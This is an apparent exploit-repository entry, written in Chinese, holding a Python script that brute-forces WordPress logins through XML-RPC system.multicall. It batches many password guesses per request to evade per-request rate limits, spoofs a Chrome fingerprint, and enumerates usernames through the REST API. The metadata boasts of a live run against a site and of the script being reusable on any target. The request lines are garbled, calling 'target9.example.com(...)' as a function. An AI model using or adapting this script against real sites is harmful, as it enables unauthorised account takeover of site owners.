# WordPress XML-RPC system.multicall 批量口令爆破（含判定特征校准）

- **code**: wordpress-xml-rpc-system.multicall-批量口令爆破-含判定特征校准
- **kind**: script
- **category**: weak-password
- **component**: WordPress XML-RPC (system.multicall)
- **versions**: 任何未关闭 xmlrpc.php 且暴露 wp.getUsersBlogs 的 WordPress 版本
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com（WordPress 5.4.15）实测跑通：495 组（5 用户 × 83 密码）全部正确返回 faultCode=403 Incorrect username or password，服务器零限速、零封禁、无验证码，HTTP 全程 200。判定特征经 demo.sayHello 成功响应与错误口令 403 响应双向校准。本目标命中 0 组（该站密码非弱口令），脚本机制本身已验证有效，可直接换目标复用。
- **path**: pocs/wordpress-xml-rpc-system.multicall-批量口令爆破-含判定特征校准/wp_xmlrpc_multicall.py
- **tags**: wordpress,xmlrpc,multicall,brute-force,旅
- **created_at**: 2026-10-05T03:56:17.082Z
- **found_by**: exploit

## 描述

用 XML-RPC system.multicall 把 WordPress 口令爆破从"每请求 1 组"提速到"每请求 10~50 组"，同时规避按请求计次的 WAF 限速。适用于任何未关闭 xmlrpc.php 且暴露 wp.getUsersBlogs 的 WordPress 站点。附带成功判定特征校准方法（blogName 为成功、faultCode 403 为失败）。

## 用法

```
1) 先 GET /wp-json/wp/v2/users?per_page=100 拿真实用户名（未授权可读）；2) 确认 POST /xmlrpc.php 的 system.listMethods 返回含 system.multicall；3) 用错口令调用一次校准 403 fault 特征；4) python wp_xmlrpc_multicall.py，改 BASE/USERS/PW/BATCH 即可。判定：响应含 blogName = 成功。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WordPress XML-RPC system.multicall 批量口令爆破
# 优势：一次 HTTP 请求试 N 组口令（N=10~50），效率比单发高 10-50 倍；
#       且不少 WAF 的"每请求计次"限速规则对 multicall 无效。
# 前提：目标 /xmlrpc.php 未关闭且 system.listMethods 里含 system.multicall。

import time, re
from curl_cffi import requests

BASE = "https://TARGET"          # 改成目标域名
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
USERS = ["admin", "administrator"]   # 先用 REST 未授权枚举拿真实用户名：GET /wp-json/wp/v2/users?per_page=100
PW = ["admin", "admin123", "123456", "password", "P@ssw0rd"]
BATCH = 10


def multicall(pairs):
    calls = "".join(
        '<value><struct>'
        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
        '<member><name>params</name><value><array><data><value><array><data>'
        '<value><string>{u}</string></value><value><string>{p}</string></value>'
        '</data></array></value></data></array></value></member></struct></value>'.format(u=u, p=p)
        for u, p in pairs)
    body = ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>' + calls + '</data></array></value></param></params>'
            '</methodCall>')
    r = target9.example.com(BASE + "/xmlrpc.php", data=body, impersonate="chrome", timeout=40,
                      headers={"Content-Type": "text/xml", "User-Agent": UA})
    return r.status_code, r.text


# ---- 判定特征（必须先校准！）----
# 成功：响应含 <name>blogName</name>
# 失败：<name>faultCode</name><value><int>403</int></value> Incorrect username or password.
# 校准命令：故意用错口令调用一次，确认拿到 403 fault。

queue = [(u, p) for u in USERS for p in PW]
hits = []
for i in range(0, len(queue), BATCH):
    chunk = queue[i:i + BATCH]
    sc, txt = multicall(chunk)
    if "blogName" in txt:
        for u, p in chunk:                    # 批次命中后逐条精确定位
            b = ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
                 '<params><param><value><string>%s</string></value></param>'
                 '<param><value><string>%s</string></value></param></params></methodCall>' % (u, p))
            rr = target9.example.com(BASE + "/xmlrpc.php", data=b, impersonate="chrome", timeout=25,
                               headers={"Content-Type": "text/xml", "User-Agent": UA})
            if "blogName" in rr.text:
                hits.append((u, p))
                print("[+++] HIT", u, "/", p, rr.text[:800])
            time.sleep(1.2)
    time.sleep(2.0)
print("命中:", hits)

```
